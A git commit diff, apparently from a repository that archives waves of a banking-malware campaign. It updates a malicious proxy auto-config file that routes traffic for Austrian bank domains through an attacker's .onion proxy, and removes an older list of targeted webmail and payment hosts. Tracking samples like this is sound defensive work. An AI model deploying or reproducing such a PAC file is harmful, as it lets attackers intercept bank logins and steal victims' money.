9e18c3db4500c559eebd07feb791037aaf97ad2a
Corsin Camichel <cocaman@gmail.com>
2016-11-09 21:03:04 +0100

    Wave 2016-11-09

--- proxy_pac_at.js
+++ proxy_pac_at.js
@@ -1,11 +1,8 @@
 function FindProxyForURL(url, host) {
-    var proxy = "PROXY r7t6zvhfwph5f6d5.onion:88;";
-    var hosts = new Array('*.facebook.com', '*.gmx.at', '*.gmx.ch', '*.gmx.com',
-        '*.gmx.de', '*.gmx.net', 'accounts.google.com', 'mail.google.com',
-        'login.live.com', 'login.yahoo.com', '*.paypal.com',
-        '*.bankaustria.at', '*.bawagpsk.com', '*.raiffeisen.at',
-        '*.bawag.com', 'www.banking.co.at', '*oberbank.at',
-        'www.oberbank-banking.at', '*.easybank.at');
+    var proxy = "PROXY 7tnrj5wewhcj76c3.onion:88;";
+    var hosts = new Array('*.bankaustria.at', '*.bawagpsk.com',
+        '*.raiffeisen.at', '*.bawag.com', 'www.banking.co.at',
+        '*oberbank.at', 'www.oberbank-banking.at', '*.easybank.at');
     for (var i = 0; i < hosts.length; i++) {
         if (shExpMatch(host, hosts[i])) {
             return proxy
